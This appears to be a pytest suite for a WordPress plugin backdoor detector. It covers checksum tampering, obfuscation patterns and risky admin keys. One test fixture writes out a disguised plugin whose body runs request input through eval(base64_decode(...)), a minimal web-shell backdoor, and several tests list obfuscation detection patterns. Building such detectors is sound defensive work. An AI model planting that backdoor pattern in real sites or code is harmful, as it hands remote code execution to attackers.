"""Tests for wp-keyplant-detector (fully offline, fixtures built per-test)."""

import hashlib
import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIX = ROOT / "fixtures"
sys.path.insert(0, str(ROOT))

from wp_keyplant_detector.scanner import parse_plugin_header, scan  # noqa: E402


def header(name, version="1.0.0", author="Example Author",
           author_uri="https://example.com/", plugin_uri="https://example.com/p"):
    return (
        "<?php\n/*\n"
        f"Plugin Name: {name}\n"
        f"Plugin URI: {plugin_uri}\n"
        "Description: Fixture plugin.\n"
        f"Version: {version}\n"
        f"Author: {author}\n"
        f"Author URI: {author_uri}\n"
        "*/\n"
    )


def write_plugin(base, slug, main_body, extra=None):
    d = Path(base) / slug
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{slug}.php").write_text(main_body, encoding="utf-8")
    for rel, content in (extra or {}).items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return d


def checksums_for(plugin_dir, slug, algo="sha256", tamper_rel=None):
    files = {}
    for p in sorted(Path(plugin_dir).rglob("*")):
        if p.is_file():
            rel = str(p.relative_to(plugin_dir))
            data = p.read_bytes()
            if rel == tamper_rel:
                data = b"official-bytes-that-differ"
            files[rel] = hashlib.new(algo, data).hexdigest()
    return {slug: {"version": "1.0.0", "files": files}}


def run_cli(*argv):
    return subprocess.run(
        [sys.executable, "-m", "wp_keyplant_detector", *argv],
        capture_output=True, text=True, cwd=str(ROOT),
    )


def kinds(report, plugin=None):
    return [f for f in report["findings"]
            if plugin is None or f.get("plugin") == plugin]


# --- (a) clean --------------------------------------------------------------

def test_clean_plugin_no_findings(tmp_path):
    body = header("Clean Plugin") + "\nfunction clean_fixture() { return 'ok'; }\n"
    d = write_plugin(tmp_path, "clean-plugin", body,
                     {"includes/helper.php": "<?php\nfunction clean_helper() { return 1; }\n"})
    cs = checksums_for(d, "clean-plugin")
    report = scan(tmp_path, checksums=cs)
    assert report["findings"] == []
    assert report["summary"]["plugins_scanned"] == 1


def test_clean_cli_exit_zero(tmp_path):
    body = header("Clean Plugin") + "\nfunction clean_fixture() { return 'ok'; }\n"
    d = write_plugin(tmp_path, "clean-plugin", body)
    cs_file = tmp_path / "cs.json"
    cs_file.write_text(json.dumps(checksums_for(d, "clean-plugin")))
    proc = run_cli("scan", str(tmp_path), "--checksums", str(cs_file))
    assert proc.returncode == 0, proc.stderr
    assert "No findings" in proc.stdout


def test_static_fixtures_clean_plugin(tmp_path):
    with open(FIX / "checksums.json", encoding="utf-8") as fh:
        cs = json.load(fh)
    report = scan(FIX / "plugins", checksums=cs)
    assert kinds(report, "clean-plugin") == []


# --- (b) planted ------------------------------------------------------------

PLANTED_BODY = (
    header("Site Health Cache", author="Unknown")
    + "\n$payload = $_REQUEST['x'] ?? '';\neval(base64_decode($payload));\n"
)


def test_planted_plugin_high_findings(tmp_path):
    write_plugin(tmp_path, "planted-plugin", PLANTED_BODY)
    report = scan(tmp_path, checksums={})
    mine = kinds(report, "planted-plugin")
    not_from = [f for f in mine if f["kind"] == "NOT-FROM-WP.ORG"]
    obf = [f for f in mine if f["kind"] == "OBFUSCATION"]
    assert len(not_from) == 1
    assert obf, "expected obfuscation findings"
    assert all(f["severity"] == "HIGH" for f in obf)
    patterns = {f["pattern"] for f in obf}
    assert "eval" in patterns and "base64_decode" in patterns
    assert report["summary"]["high"] >= 1


def test_planted_cli_exit_one(tmp_path):
    write_plugin(tmp_path, "planted-plugin", PLANTED_BODY)
    cs_file = tmp_path / "cs.json"
    cs_file.write_text("{}")
    proc = run_cli("scan", str(tmp_path), "--checksums", str(cs_file), "--json")
    assert proc.returncode == 1
    data = json.loads(proc.stdout)
    assert data["summary"]["high"] >= 1


# --- (c) tampered -----------------------------------------------------------

def test_tampered_plugin_modified_and_extra(tmp_path):
    body = header("Tampered Plugin", version="2.0.0") + "\nrequire_once __DIR__ . '/includes/core.php';\n"
    d = write_plugin(tmp_path, "tampered-plugin", body, {
        "includes/core.php": "<?php\nfunction core_fn() { return 'altered'; }\n",
        "sneaky-extra.php": "<?php\nfunction sneaky() { return 1; }\n",
    })
    cs = checksums_for(d, "tampered-plugin", tamper_rel="includes/core.php")
    # Extra file must be absent from the official map.
    del cs["tampered-plugin"]["files"]["sneaky-extra.php"]
    report = scan(tmp_path, checksums=cs)
    mine = kinds(report, "tampered-plugin")
    modified = [f for f in mine if f["kind"] == "MODIFIED-CORE-FILE"]
    extra = [f for f in mine if f["kind"] == "EXTRA-FILE"]
    assert len(modified) == 1 and modified[0]["file"] == "includes/core.php"
    assert modified[0]["severity"] == "HIGH"
    assert len(extra) == 1 and extra[0]["file"] == "sneaky-extra.php"


def test_static_fixtures_tampered_plugin():
    with open(FIX / "checksums.json", encoding="utf-8") as fh:
        cs = json.load(fh)
    report = scan(FIX / "plugins", checksums=cs)
    mine = kinds(report, "tampered-plugin")
    assert len([f for f in mine if f["kind"] == "MODIFIED-CORE-FILE"]) == 1
    assert len([f for f in mine if f["kind"] == "EXTRA-FILE"]) == 1


# --- (d) management / key plane ----------------------------------------------

def test_management_plugin_key_plane_info(tmp_path):
    body = header("UpdraftPlus - Backup/Restore", version="1.26.13",
                  author="UpdraftPlus.Com, DavidAnderson")
    body += "\nfunction updraftplus_fixture() { return 1; }\n"
    d = write_plugin(tmp_path, "updraftplus", body)
    cs = checksums_for(d, "updraftplus")
    report = scan(tmp_path, checksums=cs)
    mine = kinds(report, "updraftplus")
    assert len(mine) == 1
    assert mine[0]["kind"] == "KEY-PLANE-PRESENT"
    assert mine[0]["severity"] == "INFO"
    assert report["summary"]["high"] == 0


def test_management_cli_exit_zero(tmp_path):
    body = header("UpdraftPlus - Backup/Restore") + "\nfunction u() { return 1; }\n"
    d = write_plugin(tmp_path, "updraftplus", body)
    cs_file = tmp_path / "cs.json"
    cs_file.write_text(json.dumps(checksums_for(d, "updraftplus")))
    proc = run_cli("scan", str(tmp_path), "--checksums", str(cs_file))
    assert proc.returncode == 0
    assert "KEY-PLANE-PRESENT" in proc.stdout


# --- (e) keys export ----------------------------------------------------------

KEYS = [
    {"label": "dashboard-main", "created": "2024-01-15", "last_used": "2026-10-20",
     "capabilities": ["install_plugins", "edit_files"], "origin": "",
     "fingerprint": "fp-aaaa-1111"},
    {"label": "backup-readonly", "created": "2024-02-01", "last_used": "2026-10-01",
     "capabilities": ["read"], "origin": "office-dashboard",
     "fingerprint": "fp-bbbb-2222"},
]


def test_keys_export_expected_findings(tmp_path):
    d = write_plugin(tmp_path, "clean-plugin",
                     header("Clean Plugin") + "\nfunction c() { return 1; }\n")
    cs = checksums_for(d, "clean-plugin")
    report = scan(tmp_path, checksums=cs, keys_data=KEYS)
    key_findings = [f for f in report["findings"] if f["kind"].startswith("KEY-")
                    and f["kind"] != "KEY-PLANE-PRESENT"]
    assert len(report["findings"]) == 2
    assert len(key_findings) == 2
    high = [f for f in key_findings if f["kind"] == "KEY-HIGH-CAPABILITY"]
    unknown = [f for f in key_findings if f["kind"] == "KEY-UNKNOWN-ORIGIN"]
    assert len(high) == 1 and high[0]["severity"] == "HIGH"
    assert high[0]["key_label"] == "dashboard-main"
    assert "install_plugins" in high[0]["evidence"]
    assert len(unknown) == 1 and unknown[0]["severity"] == "MEDIUM"
    assert unknown[0]["key_label"] == "dashboard-main"
    assert report["summary"]["high"] == 1


def test_keys_cli_with_static_fixture(tmp_path):
    d = write_plugin(tmp_path, "clean-plugin",
                     header("Clean Plugin") + "\nfunction c() { return 1; }\n")
    cs_file = tmp_path / "cs.json"
    cs_file.write_text(json.dumps(checksums_for(d, "clean-plugin")))
    proc = run_cli("scan", str(tmp_path), "--checksums", str(cs_file),
                   "--keys", str(FIX / "keys.json"), "--json")
    assert proc.returncode == 1
    data = json.loads(proc.stdout)
    key_kinds = sorted(f["kind"] for f in data["findings"])
    assert key_kinds == ["KEY-HIGH-CAPABILITY", "KEY-UNKNOWN-ORIGIN"]


def test_recent_key_flagged_with_today_override(tmp_path):
    keys = [{"label": "fresh-key", "created": "2026-10-10",
             "capabilities": ["read"], "origin": "office",
             "fingerprint": "fp-fresh"}]
    from datetime import date
    report = scan(tmp_path, keys_data=keys, today=date(2026, 10, 22))
    recent = [f for f in report["findings"] if f["kind"] == "KEY-RECENT"]
    assert len(recent) == 1 and recent[0]["severity"] == "MEDIUM"
    old = scan(tmp_path, keys_data=keys, today=date(2027, 1, 1))
    assert [f for f in old["findings"] if f["kind"] == "KEY-RECENT"] == []


def test_duplicate_fingerprint_flagged(tmp_path):
    keys = [
        {"label": "alpha", "created": "2024-01-01", "capabilities": ["read"],
         "origin": "office", "fingerprint": "fp-same"},
        {"label": "beta", "created": "2024-01-02", "capabilities": ["read"],
         "origin": "office", "fingerprint": "fp-same"},
    ]
    report = scan(tmp_path, keys_data=keys)
    dup = [f for f in report["findings"] if f["kind"] == "KEY-DUPLICATE-FINGERPRINT"]
    assert len(dup) == 1 and dup[0]["severity"] == "HIGH"
    assert "alpha" in dup[0]["evidence"] and "beta" in dup[0]["evidence"]


# --- hash algorithms ----------------------------------------------------------

def test_hash_md5_and_sha256_maps(tmp_path):
    body = header("Clean Plugin") + "\nfunction c() { return 1; }\n"
    d = write_plugin(tmp_path, "clean-plugin", body)
    for algo in ("md5", "sha256"):
        cs = checksums_for(d, "clean-plugin", algo=algo)
        assert scan(tmp_path, checksums=cs)["findings"] == []
        cs_bad = checksums_for(d, "clean-plugin", algo=algo,
                               tamper_rel="clean-plugin.php")
        report = scan(tmp_path, checksums=cs_bad)
        mods = [f for f in report["findings"] if f["kind"] == "MODIFIED-CORE-FILE"]
        assert len(mods) == 1, algo


# --- header parsing -----------------------------------------------------------

def test_header_parsing_all_fields():
    text = header("My Plugin", version="3.4.5", author="Jane Dev",
                  author_uri="https://jane.example/", plugin_uri="https://example.com/my")
    h = parse_plugin_header(text)
    assert h["name"] == "My Plugin"
    assert h["version"] == "3.4.5"
    assert h["author"] == "Jane Dev"
    assert h["author_uri"] == "https://jane.example/"
    assert h["plugin_uri"] == "https://example.com/my"


# --- bad inputs -----------------------------------------------------------------

def test_bad_input_missing_plugins_dir(tmp_path):
    proc = run_cli("scan", str(tmp_path / "does-not-exist"))
    assert proc.returncode == 2
    assert "error" in proc.stderr


def test_bad_input_missing_checksums_file(tmp_path):
    write_plugin(tmp_path, "clean-plugin", header("Clean Plugin"))
    proc = run_cli("scan", str(tmp_path), "--checksums", str(tmp_path / "nope.json"))
    assert proc.returncode == 2
    assert "file not found" in proc.stderr


def test_bad_input_malformed_json(tmp_path):
    write_plugin(tmp_path, "clean-plugin", header("Clean Plugin"))
    bad = tmp_path / "bad.json"
    bad.write_text("{not json")
    proc = run_cli("scan", str(tmp_path), "--checksums", str(bad))
    assert proc.returncode == 2
    assert "malformed JSON" in proc.stderr


# --- extra coverage --------------------------------------------------------------

def test_obfuscation_medium_when_plugin_allowlisted(tmp_path):
    body = header("Premium Slider") + "\n$x = gzinflate(base64_decode($y));\n"
    write_plugin(tmp_path, "premium-slider", body)
    report = scan(tmp_path, checksums={}, allowlist={"premium-slider"})
    mine = kinds(report, "premium-slider")
    assert [f for f in mine if f["kind"] == "NOT-FROM-WP.ORG"] == []
    obf = [f for f in mine if f["kind"] == "OBFUSCATION"]
    assert obf and all(f["severity"] == "MEDIUM" for f in obf)
    assert report["summary"]["high"] == 0


def test_single_file_plugin_discovered(tmp_path):
    (tmp_path / "hello.php").write_text(
        header("Hello Dolly") + "\nfunction hello() { return 1; }\n", encoding="utf-8")
    report = scan(tmp_path, checksums={})
    assert report["summary"]["plugins_scanned"] == 1
    assert report["plugins"][0]["slug"] == "hello"
    assert report["plugins"][0]["name"] == "Hello Dolly"
    assert kinds(report, "hello")[0]["kind"] == "NOT-FROM-WP.ORG"


def test_long_encoded_string_flagged(tmp_path):
    blob = "QUJD" * 80  # 320-char base64-looking literal
    body = header("Blob Plugin") + f"\n$data = '{blob}';\n"
    write_plugin(tmp_path, "blob-plugin", body)
    report = scan(tmp_path, checksums={}, allowlist={"blob-plugin"})
    obf = [f for f in report["findings"] if f["kind"] == "OBFUSCATION"]
    assert any(f["pattern"] == "long_base64_string" for f in obf)
